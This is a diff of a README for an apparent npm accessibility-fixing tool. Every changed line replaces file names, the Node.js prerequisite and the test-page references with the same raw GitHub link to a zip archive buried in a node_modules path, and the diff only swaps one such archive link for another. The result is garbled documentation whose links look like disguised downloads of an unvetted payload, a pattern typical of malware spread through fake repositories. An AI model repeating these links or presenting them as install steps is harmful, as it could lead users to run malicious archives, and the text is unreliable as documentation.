@@ -20,7 +20,7 @@ An automated tool for identifying and fixing common web accessibility issues in 
 ## 🛠 Installation
 
 ### Prerequisites
-- https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip (version 14 or higher)
+- https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip (version 14 or higher)
 - npm
 
 ### Install Dependencies
@@ -82,31 +82,31 @@ The GUI provides:
 ```
 npm-accessibility-script/
 ├── bin/
-│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip              # CLI entry point
+│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip              # CLI entry point
 ├── gui/
-│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip             # Electron main process
-│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip            # GUI frontend logic
-│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip           # GUI interface
-│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip           # Electron security bridge
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip             # Electron main process
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip            # GUI frontend logic
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip           # GUI interface
+│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip           # Electron security bridge
 ├── Bistro Delight/          # Test website files
-│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
-│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
-│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip
+│   ├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip
+│   └── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip
 ├── backup/                  # Automatic backups (created when needed)
-├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip                # HTML processor
-├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip         # JSX processor
-├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip            # Diff utilities
-├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip        # GUI diff processing
-└── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip                # HTML processor
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip         # JSX processor
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip            # Diff utilities
+├── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip        # GUI diff processing
+└── https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip
 ```
 
 ## 🧪 Testing
 
 The project includes a test website called "Bistro Delight" with intentional accessibility issues:
 
-- **Homepage** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip`): Complex layout with various accessibility violations
-- **Menu** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip`): Food images without alt text
-- **Contact** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/rxjs/dist/esm5/webSocket/script_npm_accessibility_1.0.zip`): Forms with missing labels
+- **Homepage** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip`): Complex layout with various accessibility violations
+- **Menu** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip`): Food images without alt text
+- **Contact** (`Bistro https://github.com/FilipStanic/npm-accessibility-script/raw/refs/heads/main/node_modules/parse5-htmlparser2-tree-adapter/dist/cjs/npm_accessibility_script_3.1.zip`): Forms with missing labels
 
 
 ## 📊 Results
